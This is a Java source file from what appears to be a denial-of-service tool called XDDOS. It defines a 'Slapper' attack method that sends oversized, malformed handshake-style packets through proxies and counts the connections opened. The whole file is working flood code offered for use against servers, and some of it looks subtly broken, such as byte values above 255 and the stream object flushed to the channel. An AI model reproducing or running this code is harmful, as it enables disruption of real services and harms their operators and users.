package XD.XDDOS.methods.impl;

import java.io.IOException;

import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class Slapper implements
IMethod{
final int a = Integer.parseInt(System.getProperty("len", "25555"));

  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
    try {
      bbbb.write(15);
      bbbb.write(0);
      bbbb.write(99);
      bbbb.write(453);
      bbbb.write(457);
      bbbb.write(1);
      for (int i = 0; i < this.a; i++) {
        bbbb.write(1);
        bbbb.write(0);
      } 
    } catch (IOException e) {
      e.printStackTrace();
    } 
    channel.writeAndFlush(b);
    channel.writeAndFlush(bbbb);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
    
}
